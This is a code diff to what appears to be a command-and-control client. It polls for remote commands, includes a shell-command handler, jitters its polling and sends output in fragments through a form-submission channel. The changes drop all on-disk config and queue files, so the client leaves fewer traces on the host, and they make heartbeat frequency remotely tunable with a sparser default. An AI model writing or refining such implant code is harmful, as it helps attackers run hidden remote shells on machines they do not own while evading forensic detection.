@@ -10,73 +10,22 @@ from datetime import datetime, timezone
 
 import common
 
-# How many poll cycles between heartbeats
-HEARTBEAT_EVERY = 10
+# Default heartbeat interval in poll cycles (overridden by config command)
+_DEFAULT_HEARTBEAT_EVERY = 100
 
-# Persistent config file (written by handle_config, loaded on startup)
-_CONFIG_FILE = ".client_config.json"
-
-# Fragment send queue — persisted across cycles, one fragment sent per poll
-_SEND_QUEUE_FILE = ".fragment_send_queue.json"
-_send_queue = []  # list of outbox fragment row dicts
-
-# Known config keys and their defaults
-_KNOWN_CONFIG_KEYS = {"poll_interval_sec", "poll_jitter_min", "poll_jitter_max", "client_id"}
+# Known config keys and their defaults — all in-memory only, no disk persistence
+_KNOWN_CONFIG_KEYS = {"poll_interval_sec", "poll_jitter_min", "poll_jitter_max", "client_id", "heartbeat_every"}
 
 _client_config = {
     "poll_interval_sec": "30",
     "poll_jitter_min": "5",
     "poll_jitter_max": "15",
     "client_id": os.environ.get("CLIENT_ID", "worker-01"),
+    "heartbeat_every": str(_DEFAULT_HEARTBEAT_EVERY),
 }
 
-
-def _load_client_config():
-    """Load persisted config from disk into _client_config (only known keys)."""
-    if not os.path.exists(_CONFIG_FILE):
-        return
-    try:
-        with open(_CONFIG_FILE) as f:
-            saved = json.load(f)
-        for k, v in saved.items():
-            if k in _KNOWN_CONFIG_KEYS:
-                _client_config[k] = v
-        print(f"[client] Loaded config from {_CONFIG_FILE}")
-    except Exception as e:
-        print(f"[warn] Failed to load {_CONFIG_FILE}: {e}")
-
-
-def _save_client_config():
-    """Persist current _client_config to disk."""
-    try:
-        with open(_CONFIG_FILE, "w") as f:
-            json.dump(_client_config, f, indent=2)
-    except Exception as e:
-        print(f"[warn] Failed to save {_CONFIG_FILE}: {e}")
-
-
-def _load_send_queue():
-    """Load persisted fragment send queue from disk."""
-    global _send_queue
-    if not os.path.exists(_SEND_QUEUE_FILE):
-        return
-    try:
-        with open(_SEND_QUEUE_FILE) as f:
-            _send_queue = json.load(f)
-        if _send_queue:
-            print(f"[client] Resumed send queue: {len(_send_queue)} fragment(s) pending")
-    except Exception as e:
-        print(f"[warn] Failed to load {_SEND_QUEUE_FILE}: {e}")
-        _send_queue = []
-
-
-def _save_send_queue():
-    """Persist current send queue to disk."""
-    try:
-        with open(_SEND_QUEUE_FILE, "w") as f:
-            json.dump(_send_queue, f)
-    except Exception as e:
-        print(f"[warn] Failed to save {_SEND_QUEUE_FILE}: {e}")
+# Fragment send queue — in-memory only, lost on restart by design
+_send_queue = []
 
 
 def _get_username():
@@ -152,7 +101,7 @@ def handle_shell(payload):
 
 
 def handle_config(payload):
-    """Update client config with only known keys. Persists changes to disk."""
+    """Update client config with only known keys. In-memory only — resets on restart."""
     updated = {}
     ignored = {}
     for k, v in payload.items():
@@ -162,7 +111,6 @@ def handle_config(payload):
         else:
             ignored[k] = v
     if updated:
-        _save_client_config()
         print(f"[client] Config updated: {updated}")
     if ignored:
         print(f"[client] Ignored unknown config keys: {list(ignored.keys())}")
@@ -244,17 +192,16 @@ def send_heartbeat():
 
 def main():
     common.load_env()
-    _load_client_config()
-    _load_send_queue()
 
     processed = set()
     cycle = 0
 
-    print("[info] client starting")
+    print("[info] client starting — config resets on restart, re-send config command if needed")
 
     while True:
         # Send heartbeat on startup and every N cycles
-        if cycle == 0 or cycle % HEARTBEAT_EVERY == 0:
+        heartbeat_every = int(_client_config.get("heartbeat_every", _DEFAULT_HEARTBEAT_EVERY))
+        if cycle == 0 or cycle % heartbeat_every == 0:
             send_heartbeat()
 
         # Read outbox to rebuild processed set on first cycle
@@ -284,7 +231,6 @@ def main():
             ok = common.write_form(frag)
             if ok:
                 _send_queue.pop(0)
-                _save_send_queue()
                 remaining = len(_send_queue)
                 print(f"[client] Fragment sent for {frag['command_id']} "
                       f"({frag['status']}) — {remaining} remaining in queue")
@@ -307,7 +253,6 @@ def main():
                     processed.add(tid)
                     if len(frags) > 1:
                         _send_queue.extend(frags[1:])
-                        _save_send_queue()
                         print(f"[info] command {tid}: fragment 0/{len(frags)-1} sent, "
                               f"{len(frags)-1} queued")
                     else:
